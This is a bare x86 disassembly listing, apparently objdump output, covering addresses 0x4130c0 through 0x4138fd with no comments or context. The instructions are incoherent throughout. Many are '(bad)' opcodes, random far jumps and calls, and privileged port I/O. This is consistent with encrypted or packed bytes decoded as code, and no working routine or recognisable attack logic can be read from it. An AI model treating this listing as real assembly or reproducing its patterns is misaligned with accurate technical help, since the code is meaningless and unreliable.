  4130c0:	mov    edx,0xd9d59ed1
  4130c5:	add    al,0x88
  4130c7:	pushf  
  4130c8:	mov    DWORD PTR [edi-0x240eb8cb],0x9e57c759
  4130d2:	jl     0x413134
  4130d4:	and    al,0x63
  4130d6:	add    DWORD PTR [edx*2-0x7998ac33],0xab523682
  4130e1:	cld    
  4130e2:	cmp    DWORD PTR [eax],eax
  4130e4:	sbb    eax,0x6108357
  4130e9:	daa    
  4130ea:	and    eax,DWORD PTR [eax-0x70c746c9]
  4130f0:	add    al,0x98
  4130f2:	call   0xe275:0x8ecc732a
  4130f9:	dec    edi
  4130fa:	std    
  4130fb:	fild   DWORD PTR [edx+0x19]
  4130fe:	fcmovbe st,st(4)
  413100:	stos   BYTE PTR es:[edi],al
  413101:	fld    TBYTE PTR [ecx]
  413103:	fisubr WORD PTR [ecx+ebp*2-0x27]
  413107:	mov    ah,dl
  413109:	stos   DWORD PTR es:[edi],eax
  41310a:	inc    esp
  41310b:	mov    ds:0xf270dc0b,eax
  413110:	cmc    
  413111:	test   eax,0xc20041b7
  413116:	aas    
  413117:	sbb    bl,cl
  413119:	jno    0x4130e6
  41311b:	pop    ebp
  41311c:	add    DWORD PTR [eax],0xebf1c8
  413122:	in     eax,0x84
  413124:	push   esp
  413125:	add    ch,BYTE PTR [edi+0x1e8551ee]
  41312b:	or     eax,ecx
  41312d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41312e:	push   0x61bc26b8
  413133:	scas   al,BYTE PTR es:[edi]
  413134:	and    eax,0xfefa456
  413139:	sar    BYTE PTR [ecx],0x9
  41313c:	fidiv  DWORD PTR [edi+edi*2]
  41313f:	popa   
  413140:	sub    ecx,DWORD PTR [edx+ecx*4-0x47]
  413144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413145:	ret    0x6a23
  413148:	mov    edi,0x12703d55
  41314d:	pop    edi
  41314e:	and    BYTE PTR [ecx],al
  413150:	adc    al,BYTE PTR [ebp+0x3a]
  413153:	loope  0x413143
  413155:	cmp    DWORD PTR [esi],ebx
  413157:	mov    dl,0x60
  413159:	ja     0x4130ec
  41315b:	add    DWORD PTR [ecx],0xffffffb6
  41315e:	retf   0x73fa
  413161:	inc    ecx
  413162:	dec    ebp
  413163:	lahf   
  413164:	clc    
  413165:	rcl    BYTE PTR gs:[eax],cl
  413168:	fisttp WORD PTR [ebx]
  41316a:	js     0x413150
  41316c:	loope  0x4131e0
  41316e:	push   edi
  41316f:	js     0x41310e
  413171:	xchg   esp,eax
  413172:	push   ds
  413173:	outs   dx,BYTE PTR ds:[esi]
  413174:	pop    esi
  413175:	in     eax,0xb6
  413177:	mov    eax,0x1d65730c
  41317c:	mov    eax,0xfdfd64c4
  413181:	(bad)  
  413182:	fcomi  st,st(4)
  413184:	retf   0xbe6c
  413187:	dec    esi
  413188:	mov    ds:0xaeeb49c2,al
  41318d:	mov    al,0xa6
  41318f:	push   0x6472a3da
  413194:	aad    0xed
  413196:	xchg   DWORD PTR [edi],edx
  413198:	int    0xc2
  41319a:	fdivr  DWORD PTR [esi-0x5d]
  41319d:	xchg   ecx,eax
  41319e:	dec    esp
  41319f:	rcl    ebp,1
  4131a1:	icebp  
  4131a2:	ss push 0x798301d4
  4131a8:	push   ss
  4131a9:	push   esi
  4131aa:	call   0xd716f17d
  4131af:	cmp    DWORD PTR [eax-0x6c],ecx
  4131b2:	js     0x413231
  4131b4:	popa   
  4131b5:	or     dh,BYTE PTR [edx]
  4131b7:	lock imul esi,DWORD PTR [ecx+eiz*8+0x70],0xb01aabed
  4131c0:	or     esp,DWORD PTR [ecx-0x7a81e192]
  4131c6:	imul   ebx,esi,0x3ec3f0bd
  4131cc:	fstp   DWORD PTR [eax+0x5f]
  4131cf:	jecxz  0x413231
  4131d1:	mov    eax,ds:0x4e4ab421
  4131d6:	hlt    
  4131d7:	stc    
  4131d8:	xchg   esi,eax
  4131d9:	mov    BYTE PTR [ecx-0x63c0f715],dl
  4131df:	gs (bad) 
  4131e1:	cmp    al,0x33
  4131e3:	push   es
  4131e4:	mov    ds:0xfa922356,eax
  4131e9:	je     0x4131c3
  4131eb:	(bad)  
  4131ec:	sbb    DWORD PTR [ebp-0x53b2cd39],ebx
  4131f2:	dec    ebx
  4131f3:	sbb    BYTE PTR [esi+0x201364be],ch
  4131f9:	test   eax,0xdce6ff7d
  4131fe:	cli    
  4131ff:	in     eax,dx
  413200:	stc    
  413201:	sub    DWORD PTR [esi-0x3d],esp
  413204:	fld    QWORD PTR [edi+ebx*8]
  413207:	inc    ebx
  413208:	out    dx,al
  413209:	add    DWORD PTR [edx],ebp
  41320b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41320c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320d:	call   DWORD PTR [ecx]
  41320f:	xor    dl,BYTE PTR [esi-0x80]
  413212:	jbe    0x413265
  413214:	scas   al,BYTE PTR es:[edi]
  413215:	aad    0x73
  413217:	lds    ebx,FWORD PTR [esi]
  413219:	fstp   TBYTE PTR [eax-0x42]
  41321c:	mov    eax,ds:0x8d367b43
  413221:	cmp    DWORD PTR [edx+ecx*2],eax
  413224:	inc    ebx
  413225:	mov    esi,DWORD PTR [ecx+0x5c]
  413228:	fptan  
  41322a:	jno    0x4131b7
  41322c:	les    eax,FWORD PTR [esi-0x1a905b4d]
  413232:	fld    QWORD PTR ss:[eax-0x54c6f449]
  413239:	add    eax,0xc6cdf15d
  41323e:	inc    esp
  41323f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413240:	jmp    0x6fb4:0x32d861c4
  413247:	inc    esi
  413248:	and    eax,0x50988d91
  41324d:	adc    DWORD PTR [ecx],ebp
  41324f:	mov    edx,0xa7a0833e
  413254:	mov    WORD PTR [ecx-0x5f],ds
  413257:	fnsave [esp+edi*8+0x1f]
  41325b:	jge    0x413286
  41325d:	cdq    
  41325e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41325f:	int    0x7d
  413261:	push   edi
  413262:	shr    DWORD PTR [esi+0x34e7695a],1
  413268:	or     eax,0xae543155
  41326d:	add    DWORD PTR [ebx+0x62],edi
  413270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413271:	sbb    BYTE PTR [ebx*8+0x755719c2],ah
  413278:	pop    ebx
  413279:	mov    bl,0x61
  41327b:	gs aam 0x6b
  41327e:	jb     0x413257
  413280:	push   ebx
  413281:	pop    esp
  413282:	imul   ebp,DWORD PTR [ecx],0x8a8d388
  413288:	sub    al,0x86
  41328a:	xor    eax,0xa77da90a
  41328f:	add    BYTE PTR [ebp+edi*2-0x79b37903],bh
  413296:	pop    ebx
  413297:	add    eax,0x7251d990
  41329c:	adc    DWORD PTR [ebx+0x6046a7e3],esp
  4132a2:	imul   esp,DWORD PTR [ecx-0x29b7265e],0x9
  4132a9:	aas    
  4132aa:	jge    0x41329b
  4132ac:	add    al,0xd6
  4132ae:	jbe    0x41331e
  4132b0:	sbb    cl,BYTE PTR [ebp*2+0x51fce4fa]
  4132b7:	mov    eax,0x9cb53fed
  4132bc:	es fs mov ebx,0x152045d7
  4132c3:	cmp    eax,0xc58a6975
  4132c8:	xor    al,0x9c
  4132ca:	pop    ecx
  4132cb:	cmp    bl,ah
  4132cd:	aam    0x13
  4132cf:	dec    ebx
  4132d0:	adc    DWORD PTR [edi+0x569f4332],ebp
  4132d6:	mov    edx,0xc4d9b4b2
  4132db:	popa   
  4132dc:	or     edx,esi
  4132de:	jmp    0x41326a
  4132e0:	or     ebp,DWORD PTR [eax]
  4132e2:	or     bl,BYTE PTR [ebx-0x28]
  4132e5:	mov    esp,0x2868228
  4132ea:	or     DWORD PTR [eax-0x76],ebx
  4132ed:	sub    esp,DWORD PTR es:0xdf072f2c
  4132f4:	into   
  4132f5:	stc    
  4132f6:	int    0x98
  4132f8:	or     DWORD PTR [eax+0x76],edi
  4132fb:	fiadd  DWORD PTR [ebx+0x17]
  4132fe:	loopne 0x413369
  413300:	push   ebp
  413301:	sbb    eax,0x9e9f5b80
  413306:	sub    al,0x4
  413308:	or     BYTE PTR [edi+0x1c88774e],0xe
  41330f:	mov    ebx,0xbbf9708d
  413314:	xchg   BYTE PTR [eax-0x3b],ch
  413317:	xchg   BYTE PTR [ebx-0x3b294ac9],cl
  41331d:	jae    0x4132f2
  41331f:	push   ecx
  413320:	mov    eax,ds:0x65a00582
  413325:	shl    ebx,1
  413327:	into   
  413328:	jl     0x413320
  41332a:	into   
  41332b:	push   ebx
  41332c:	fdivp  st(5),st
  41332e:	loope  0x413387
  413330:	push   ds
  413331:	lahf   
  413332:	xor    cl,BYTE PTR [eax+0x4ae84932]
  413338:	or     eax,0xb30e7774
  41333d:	aaa    
  41333e:	mov    al,0xbb
  413340:	fldenv [edx+0x25]
  413343:	clc    
  413344:	lock rcl DWORD PTR [ebp+0x1f2ec624],0x7d
  41334c:	fcom   DWORD PTR [ebp-0x693e77b8]
  413352:	mov    ds:0x9d2b3393,eax
  413357:	adc    edx,DWORD PTR [eax+0x2f]
  41335a:	dec    esi
  41335b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41335c:	push   ss
  41335d:	pop    es
  41335e:	xlat   BYTE PTR ds:[ebx]
  41335f:	push   es
  413360:	test   al,0x37
  413362:	jecxz  0x4133b6
  413364:	dec    ecx
  413365:	push   esp
  413366:	push   esp
  413367:	xchg   ecx,eax
  413368:	push   ebx
  413369:	div    DWORD PTR [ebx-0x35]
  41336c:	cmc    
  41336d:	in     eax,dx
  41336e:	adc    eax,DWORD PTR [eax-0x6e41a5a3]
  413374:	push   0x19199dc9
  413379:	mov    dl,0x3c
  41337b:	or     al,0xcf
  41337d:	dec    esi
  41337e:	sub    al,0xdb
  413380:	loopne 0x413303
  413382:	xor    al,0x9c
  413384:	test   DWORD PTR [edx+ebx*8-0x16],eax
  413388:	mov    dl,0x1f
  41338a:	mov    eax,ds:0xe89c8eba
  41338f:	push   0x67
  413391:	sub    BYTE PTR ds:0x3384eb,bl
  413397:	jmp    0x41337f
  413399:	(bad)  [esi]
  41339b:	ret    
  41339c:	ja     0x4133c4
  41339e:	add    bh,dh
  4133a0:	int    0x18
  4133a2:	ds and dl,bl
  4133a5:	push   0xffffff9b
  4133a7:	jmp    0x45d5351d
  4133ac:	fsub   DWORD PTR [ecx]
  4133ae:	mov    dh,BYTE PTR [ebx]
  4133b0:	or     al,0x27
  4133b2:	rcr    DWORD PTR [esi-0x1b],1
  4133b5:	inc    esp
  4133b6:	pop    esi
  4133b7:	sub    eax,0xde849449
  4133bc:	ja     0x4133c1
  4133be:	dec    edi
  4133bf:	stos   BYTE PTR es:[edi],al
  4133c0:	jge    0x41343b
  4133c2:	pop    esp
  4133c3:	jmp    0x4133ae
  4133c5:	xor    BYTE PTR [ebx-0x3f429ccc],0x8d
  4133cc:	loope  0x413428
  4133ce:	push   cs
  4133cf:	dec    ebx
  4133d0:	inc    edx
  4133d1:	repz and edx,DWORD PTR [edx]
  4133d4:	call   0x7c69d201
  4133d9:	and    eax,0x551a8c77
  4133de:	ja     0x413414
  4133e0:	mov    cl,0xcc
  4133e2:	retf   
  4133e3:	in     eax,dx
  4133e4:	stc    
  4133e5:	inc    ecx
  4133e6:	out    0x9,al
  4133e8:	add    BYTE PTR [edx+0x775233a9],cl
  4133ee:	ror    DWORD PTR [ecx-0x7],cl
  4133f1:	lahf   
  4133f2:	jmp    0x41344e
  4133f4:	jo     0x413433
  4133f6:	ret    
  4133f7:	cmp    edx,ecx
  4133f9:	js     0x413477
  4133fb:	jo     0x41339b
  4133fd:	push   0x5f
  4133ff:	adc    edi,DWORD PTR [ebx+ecx*4+0x47]
  413403:	mov    dh,0x78
  413405:	dec    eax
  413406:	sahf   
  413407:	cmc    
  413408:	aas    
  413409:	jp     0x41342a
  41340b:	mov    esi,0x503ba369
  413410:	scas   eax,DWORD PTR es:[edi]
  413411:	add    eax,0xeaf5d208
  413416:	ret    
  413417:	rol    BYTE PTR [ecx-0x37329689],cl
  41341d:	xchg   ecx,eax
  41341e:	jge    0x4133f5
  413420:	sub    ch,BYTE PTR [edx+0x7]
  413423:	push   edx
  413424:	dec    edi
  413425:	pusha  
  413426:	mov    ds:0x90a0635d,al
  41342b:	lods   eax,DWORD PTR ds:[esi]
  41342c:	aas    
  41342d:	lods   eax,DWORD PTR ds:[esi]
  41342e:	add    ah,bl
  413430:	call   0xd30d:0xd97382c4
  413437:	retf   0x7909
  41343a:	mov    ecx,0x9d72aa7d
  41343f:	jb     0x41348b
  413441:	mov    edi,0xa4fc3546
  413446:	pop    esi
  413447:	dec    DWORD PTR [ebx+0x888b51b]
  41344d:	inc    edi
  41344e:	cli    
  41344f:	sbb    al,0x41
  413451:	sti    
  413452:	fadd   QWORD PTR [ebp-0x42]
  413455:	mov    esi,0xeeae5be7
  41345a:	adc    ah,BYTE PTR [edx]
  41345c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41345d:	sbb    al,0x24
  41345f:	lahf   
  413460:	sub    ebx,DWORD PTR [ebx-0x72]
  413463:	mov    cl,0x12
  413465:	fs (bad) 
  413467:	mov    ds:0x3101b27f,al
  41346c:	fisub  WORD PTR [ebx]
  41346e:	leave  
  41346f:	popf   
  413470:	mov    dl,0xcc
  413472:	retf   0xce3e
  413475:	add    DWORD PTR [ecx+eax*2+0x9],edi
  413479:	fs es sbb dl,ah
  41347d:	and    BYTE PTR [ecx-0x4c],dh
  413480:	mov    edx,0x2c3b26fa
  413485:	sbb    BYTE PTR [esp+ecx*8+0x76e9270c],cl
  41348c:	cmp    bl,BYTE PTR [esi+ebp*2]
  41348f:	aaa    
  413490:	fucom  st(5)
  413492:	cld    
  413493:	jb     0x41346f
  413495:	dec    edi
  413496:	jne    0x41343c
  413498:	int3   
  413499:	pop    esp
  41349a:	cmp    BYTE PTR ds:0x9fb879ad,dh
  4134a0:	ins    DWORD PTR es:[edi],dx
  4134a1:	mov    WORD PTR [ebx],ds
  4134a3:	fsubrp st(0),st
  4134a5:	test   DWORD PTR [eax-0x31abc95d],ecx
  4134ab:	xor    DWORD PTR [ecx+0x3b529670],0x2
  4134b2:	jmp    0xc884:0xe751953b
  4134b9:	imul   ebx,DWORD PTR [ebx],0xed3d2f76
  4134bf:	inc    esi
  4134c0:	in     eax,dx
  4134c1:	and    DWORD PTR [ecx*1-0x104ba1d9],esp
  4134c8:	(bad)  
  4134c9:	fnsave [edx+0x5eb1339e]
  4134cf:	test   BYTE PTR [edi],dl
  4134d1:	addr16 popf 
  4134d3:	je     0x4134b6
  4134d5:	repnz sub eax,0xa4e0c714
  4134db:	push   ds
  4134dc:	in     al,0xb8
  4134de:	(bad)  
  4134e0:	xchg   esp,eax
  4134e1:	test   al,0x55
  4134e3:	adc    DWORD PTR [eax-0x5a],ecx
  4134e6:	dec    ecx
  4134e7:	fstp   QWORD PTR [edx-0x70]
  4134ea:	fs jb  0x413531
  4134ed:	cmp    DWORD PTR [edi+esi*2+0x684a86af],ecx
  4134f4:	daa    
  4134f5:	cdq    
  4134f6:	mov    ecx,0x7c50ca9b
  4134fb:	inc    edi
  4134fc:	push   eax
  4134fd:	adc    DWORD PTR [edi-0x231f26bc],edi
  413503:	and    eax,0x55334ebd
  413508:	in     al,0xa0
  41350a:	fadd   QWORD PTR [ebx]
  41350c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41350d:	scas   eax,DWORD PTR es:[edi]
  41350e:	xchg   BYTE PTR [esi],bh
  413510:	mov    al,0x79
  413512:	out    dx,eax
  413513:	jl     0x4134d6
  413515:	ins    DWORD PTR es:[edi],dx
  413516:	push   0xffffff97
  413518:	xor    ah,BYTE PTR [esi-0x4b]
  41351b:	and    dh,dh
  41351d:	ret    0x54c5
  413520:	test   eax,0x7b39b244
  413525:	test   DWORD PTR [edi-0x55],ebx
  413528:	xchg   bl,ch
  41352a:	clc    
  41352b:	fdivrp st(4),st
  41352d:	inc    eax
  41352e:	or     eax,eax
  413530:	lock dec edi
  413532:	lea    esp,[esi+0x1e958568]
  413538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413539:	aaa    
  41353a:	add    cl,BYTE PTR [esi+0xf]
  41353d:	mov    bl,0x53
  41353f:	mov    al,0x91
  413541:	mov    ah,ah
  413543:	aad    0xa5
  413545:	sub    al,BYTE PTR [eax-0x6c]
  413548:	push   ds
  413549:	ins    DWORD PTR es:[edi],dx
  41354a:	inc    eax
  41354c:	iret   
  41354d:	pcmpgtb mm6,QWORD PTR [eax-0xb0c770f]
  413554:	outs   dx,DWORD PTR ds:[esi]
  413555:	addr16 (bad) 
  413558:	xlat   BYTE PTR ds:[ebx]
  413559:	and    DWORD PTR [edi+ecx*1],0xf2ee4e48
  413560:	inc    DWORD PTR ds:0x2406631e
  413566:	pop    es
  413567:	mov    ch,0x2d
  413569:	fldcw  WORD PTR [edi+0x67bf6080]
  41356f:	aam    0xc4
  413571:	dec    ecx
  413572:	jl     0x4135ef
  413574:	inc    esp
  413575:	xor    cl,BYTE PTR [edx+0x19]
  413578:	lods   eax,DWORD PTR ds:[esi]
  413579:	or     BYTE PTR [ebp+0x4f],ah
  41357c:	mov    dl,0xef
  41357e:	ins    DWORD PTR es:[edi],dx
  41357f:	add    DWORD PTR [eax],edi
  413581:	dec    eax
  413582:	push   ebp
  413583:	and    DWORD PTR [ecx+ecx*1-0x67],esp
  413587:	dec    esp
  413588:	ja     0x4135a3
  41358a:	pop    eax
  41358b:	fadd   DWORD PTR fs:[esi-0x2e]
  41358f:	aaa    
  413590:	pop    eax
  413591:	or     cl,al
  413593:	or     al,0xc6
  413595:	adc    DWORD PTR [esi+eiz*4+0x7e],0xa79a773a
  41359d:	and    esi,eax
  41359f:	adc    bh,BYTE PTR [edi-0x19c26c58]
  4135a5:	das    
  4135a6:	and    ah,0x2
  4135a9:	rcl    BYTE PTR [esi-0x19],0x7a
  4135ad:	xchg   esi,eax
  4135ae:	pop    ebp
  4135af:	ret    
  4135b0:	cld    
  4135b1:	in     eax,dx
  4135b2:	in     al,dx
  4135b3:	fmul   QWORD PTR [ebp-0x62863ba3]
  4135b9:	cmp    eax,0x900ea161
  4135be:	jnp    0xea140ec6
  4135c4:	cmp    al,dl
  4135c6:	mov    ebp,0x374871b0
  4135cb:	add    BYTE PTR [ecx],bl
  4135cd:	jp     0x4135da
  4135cf:	sub    ch,BYTE PTR [eax-0x3f]
  4135d2:	dec    esi
  4135d3:	call   0x23f1:0xe5ad653b
  4135da:	mov    bl,0x5a
  4135dc:	in     eax,dx
  4135dd:	out    dx,al
  4135de:	pop    esp
  4135df:	xchg   edx,eax
  4135e0:	mov    ds:0xc832eeae,al
  4135e5:	popa   
  4135e6:	and    eax,0x9365c9b
  4135eb:	std    
  4135ec:	mov    esp,0xf40fdcde
  4135f1:	dec    eax
  4135f2:	mov    esi,ss
  4135f4:	xor    ebp,DWORD PTR [edx]
  4135f6:	add    BYTE PTR [ebp+0x0],bh
  4135f9:	cdq    
  4135fa:	push   cs
  4135fb:	popa   
  4135fc:	or     dh,ah
  4135fe:	dec    esp
  4135ff:	mov    edi,0x26707bbe
  413604:	pop    es
  413605:	push   ss
  413606:	xchg   edi,eax
  413607:	push   esi
  413608:	les    esp,FWORD PTR [edx]
  41360a:	sbb    BYTE PTR [bp+si-0x52c4],dl
  41360f:	sub    eax,0x44658c0c
  413614:	int    0x6b
  413616:	jge    0x4135b1
  413618:	aaa    
  413619:	mov    ah,0xee
  41361b:	pusha  
  41361c:	pusha  
  41361d:	cmp    DWORD PTR [ebx+0x7a88dfe6],eax
  413623:	add    ebx,ebx
  413625:	retf   0xaedf
  413628:	jmp    0x2c81:0x6de10806
  41362f:	fdivr  DWORD PTR [ebp-0x10de513f]
  413635:	mov    ah,0xc7
  413637:	sub    al,0x2d
  413639:	push   ebp
  41363a:	(bad)  
  41363b:	cwde   
  41363c:	dec    ebp
  41363d:	pop    ebx
  41363e:	push   ecx
  41363f:	pop    edi
  413640:	shl    BYTE PTR [edx+ebp*4-0x42],cl
  413644:	xlat   BYTE PTR ds:[ebx]
  413645:	fild   DWORD PTR [edx+0x33d1f0f8]
  41364b:	mov    ebx,0xdd72ec5
  413650:	xor    BYTE PTR [edi+0x469dd4c1],dl
  413656:	sbb    dh,ah
  413658:	cmp    al,0x5c
  41365a:	std    
  41365b:	adc    ch,0x41
  41365e:	xor    al,BYTE PTR [edx-0x3b25964b]
  413664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413665:	stos   BYTE PTR es:[edi],al
  413666:	sar    BYTE PTR [eax-0x195e111f],cl
  41366c:	push   ds
  41366d:	(bad)  
  41366e:	scas   al,BYTE PTR es:[edi]
  41366f:	mov    edi,0x130d9dab
  413674:	imul   esp,ebp,0xffffff8c
  413677:	ins    BYTE PTR es:[edi],dx
  413678:	inc    esp
  413679:	mov    eax,ds:0x67137db3
  41367e:	add    al,0xf3
  413680:	in     eax,0x1d
  413682:	add    bl,bl
  413684:	fwait
  413685:	xchg   BYTE PTR ds:0xd2cb1122,bh
  41368b:	inc    edx
  41368c:	(bad)  
  41368d:	mov    edi,0xb9703fdd
  413692:	(bad)  
  413694:	cmp    BYTE PTR [edx],bl
  413696:	dec    edi
  413697:	pop    esp
  413698:	xor    al,0x5d
  41369a:	cmp    al,0xd7
  41369c:	pop    ds
  41369d:	jmp    0x4136f0
  41369f:	fdivr  DWORD PTR [edx+0x3c]
  4136a2:	fmul   QWORD PTR [edx-0x3a1afc46]
  4136a8:	jnp    0x4136c3
  4136aa:	arpl   WORD PTR [ebx],si
  4136ac:	pop    edx
  4136ad:	sub    eax,DWORD PTR [ebp+0x81566b3]
  4136b3:	cmp    edx,0xffffffe3
  4136b6:	dec    esi
  4136b7:	test   DWORD PTR [edi+0x3dd77fb3],esp
  4136bd:	jnp    0x4136cd
  4136bf:	adc    ebp,DWORD PTR [edi-0x20248fb1]
  4136c5:	add    al,0x31
  4136c7:	mov    edi,0x2373290a
  4136cc:	push   es
  4136cd:	mov    edx,0x7b5c8487
  4136d2:	xchg   ebp,eax
  4136d3:	jmp    0x1ca2:0x488e6b0
  4136da:	icebp  
  4136db:	pop    esi
  4136dc:	daa    
  4136dd:	mov    cs,edx
  4136df:	sub    al,0x91
  4136e1:	cs xchg eax,eax
  4136e4:	(bad)  
  4136e5:	shl    DWORD PTR [esp+ebp*4],1
  4136e8:	test   eax,0xc840921d
  4136ed:	push   cs
  4136ee:	sub    ecx,DWORD PTR [esi]
  4136f0:	shl    DWORD PTR [edx-0x21],1
  4136f3:	js     0x4136c2
  4136f5:	fsubr  DWORD PTR [edi+0x65]
  4136f8:	pop    es
  4136f9:	jae    0x413690
  4136fb:	scas   eax,DWORD PTR es:[edi]
  4136fc:	rcl    esi,0x1d
  4136ff:	bound  edx,QWORD PTR [esi+0x7cca7dab]
  413705:	pop    ebx
  413706:	cmp    al,ah
  413708:	out    0x79,eax
  41370a:	mov    DWORD PTR [esi+eiz*1],edx
  41370d:	push   edx
  41370e:	test   DWORD PTR [edx-0x7a],0xc1450e5c
  413715:	scas   al,BYTE PTR es:[edi]
  413716:	sub    eax,0xc48b74cd
  41371b:	jmp    0xa2a8994
  413720:	rcl    DWORD PTR [ebp-0x51],0x57
  413724:	mov    BYTE PTR [eax+eiz*1-0x75],ah
  413728:	(bad)  
  413729:	jo     0x41378b
  41372b:	jg     0x41376e
  41372d:	sbb    cl,bh
  41372f:	jmp    0x41376d
  413731:	lods   eax,DWORD PTR ds:[esi]
  413732:	dec    eax
  413733:	fmul   st(4),st
  413735:	test   BYTE PTR [ecx],dl
  413737:	iret   
  413738:	test   DWORD PTR [ecx-0xdfe419f],0xa1d5479c
  413742:	mov    al,0x72
  413744:	sub    al,0x69
  413746:	cli    
  413747:	and    ebx,eax
  413749:	bound  edx,QWORD PTR ds:0x270c67e5
  41374f:	inc    ecx
  413750:	(bad)  [edi+0x4bca4143]
  413756:	push   cs
  413757:	xor    al,0x85
  413759:	jbe    0x4137c5
  41375b:	sti    
  41375c:	dec    dl
  41375e:	adc    cl,dh
  413760:	sar    BYTE PTR [edx],cl
  413762:	fiadd  WORD PTR [edx+0x6d3d7c1f]
  413768:	outs   dx,BYTE PTR ds:[esi]
  413769:	inc    edi
  41376a:	js     0x41372e
  41376c:	cmp    eax,0x502bd9e5
  413771:	int3   
  413772:	push   es
  413773:	test   BYTE PTR [edx],al
  413775:	or     ch,0xad
  413778:	inc    ebx
  413779:	lock or eax,0x389e2833
  41377f:	dec    edi
  413780:	mov    al,0xdf
  413782:	dec    ecx
  413783:	jae    0x4137bc
  413785:	(bad)  
  413786:	ins    BYTE PTR es:[edi],dx
  413787:	pop    es
  413788:	push   ebp
  413789:	sbb    al,0x1a
  41378b:	push   0x2d
  41378d:	mov    dh,0x80
  41378f:	fcmovne st,st(5)
  413791:	fcomi  st,st(5)
  413793:	dec    ebp
  413794:	mov    al,ds:0xe16b840a
  413799:	rol    DWORD PTR [ecx],cl
  41379b:	fidiv  DWORD PTR [eax+0x6a]
  41379e:	xchg   edi,eax
  41379f:	fwait
  4137a0:	xor    eax,0x5937bc42
  4137a5:	mov    bx,bp
  4137a8:	outs   dx,DWORD PTR ds:[esi]
  4137a9:	(bad)  
  4137aa:	sbb    eax,0xa4a08ff3
  4137af:	sbb    edx,DWORD PTR [ebx+0x57]
  4137b2:	xor    DWORD PTR [edi+0x67d80b25],ebx
  4137b8:	cmp    DWORD PTR [edx-0x61e359f7],0xc91f6c9f
  4137c2:	mov    cl,0xb6
  4137c4:	sub    ch,BYTE PTR [esi]
  4137c6:	pop    eax
  4137c7:	fsub   DWORD PTR [ebx]
  4137c9:	test   eax,0xcc37feb5
  4137ce:	ret    0x7a6b
  4137d1:	mov    ds:0x60af565b,eax
  4137d6:	xlat   BYTE PTR ds:[ebx]
  4137d7:	push   edi
  4137d8:	jle    0x41380b
  4137da:	xchg   esi,eax
  4137db:	adc    al,0x9a
  4137dd:	ins    DWORD PTR es:[edi],dx
  4137de:	add    DWORD PTR [ecx+0x18baaf24],esp
  4137e4:	mov    bl,0xa5
  4137e6:	xchg   ebp,eax
  4137e7:	sbb    eax,0xd982d8d6
  4137ec:	sbb    eax,0x4875b28e
  4137f1:	inc    edi
  4137f2:	mov    edi,0xdcaeaacf
  4137f7:	hlt    
  4137f8:	push   0x591745f1
  4137fd:	xchg   esi,eax
  4137fe:	mov    dh,0x20
  413800:	push   ss
  413801:	loop   0x413879
  413803:	dec    esp
  413804:	mov    eax,ds:0x24537242
  413809:	add    al,0x84
  41380b:	mov    edi,0xcdba3097
  413810:	lock jbe 0x413881
  413813:	xchg   BYTE PTR [esi+0x5],dh
  413816:	dec    esp
  413817:	mov    ebp,0x58990786
  41381c:	test   eax,0xb26fb65c
  413821:	js     0x413861
  413823:	mov    esi,0xc69f39b
  413828:	push   es
  413829:	pop    ss
  41382a:	pop    esi
  41382b:	xchg   ecx,eax
  41382c:	not    DWORD PTR [edx+0x2e4b04dd]
  413832:	add    DWORD PTR [esi-0x5d],edx
  413835:	push   esi
  413836:	sahf   
  413837:	pop    edx
  413838:	ins    BYTE PTR es:[edi],dx
  413839:	fadd   DWORD PTR ds:0x667796cf
  41383f:	mov    bh,0xdc
  413841:	jmp    0x145e:0x2ea57a09
  413848:	addr16 cmp eax,0x760ce9c1
  41384e:	pop    edi
  41384f:	daa    
  413850:	inc    edi
  413851:	ins    BYTE PTR es:[edi],dx
  413852:	cmp    DWORD PTR ds:0xe8df0780,eax
  413858:	mov    esp,0x19f49206
  41385d:	push   ebp
  41385e:	jnp    0x4138db
  413860:	ins    BYTE PTR es:[edi],dx
  413861:	sbb    al,0xb3
  413863:	mov    ecx,0x8d3eb51d
  413868:	stos   BYTE PTR es:[edi],al
  413869:	xchg   ebp,eax
  41386a:	add    eax,0xf06ad543
  41386f:	add    ecx,DWORD PTR ds:0x28dbbb22
  413875:	mov    al,ds:0x6fb2cd82
  41387a:	jmp    0x413805
  41387c:	push   cs
  41387d:	xor    edi,edx
  41387f:	aas    
  413880:	jno    0x413889
  413882:	sbb    bl,BYTE PTR [ecx-0x7a15c4bc]
  413888:	sub    ebp,ebp
  41388a:	jle    0x4138d0
  41388c:	and    DWORD PTR [eax],esp
  41388e:	or     bh,BYTE PTR [edx+0x72]
  413891:	dec    ecx
  413892:	mov    al,0xca
  413894:	loopne 0x4138a4
  413896:	sbb    al,0xe8
  413898:	cwde   
  413899:	addr16 fwait
  41389b:	call   0x5712:0x4ce8beb3
  4138a2:	push   cs
  4138a3:	fsub   DWORD PTR [ebp+0x56]
  4138a6:	inc    edi
  4138a7:	jecxz  0x413890
  4138a9:	(bad)  
  4138aa:	ficom  WORD PTR [eax+edx*2-0x58b7fa8f]
  4138b1:	sbb    BYTE PTR [edi+0x368b0512],0x80
  4138b8:	cmp    cl,BYTE PTR [ecx+0x63]
  4138bb:	fadd   QWORD PTR [edi+edx*1]
  4138be:	popa   
  4138bf:	mov    ds:0x84e21c38,eax
  4138c4:	pushf  
  4138c5:	sub    BYTE PTR [ebx],0xff
  4138c8:	or     esp,DWORD PTR [ecx-0x62693efc]
  4138ce:	jne    0x413933
  4138d0:	jne    0x41393e
  4138d2:	push   esi
  4138d3:	xchg   esi,eax
  4138d4:	ds imul esi,edi,0x67aa5fd2
  4138db:	pop    ebp
  4138dc:	sub    eax,0xc188272b
  4138e1:	add    BYTE PTR [edi+0x707d9451],ah
  4138e7:	xchg   edx,eax
  4138e8:	test   eax,0x4e9efd54
  4138ed:	(bad)  
  4138ef:	add    BYTE PTR [eax+esi*4+0x7585c70],dh
  4138f6:	jmp    0xe5b9:0xde33e3bc
  4138fd:	(bad)  
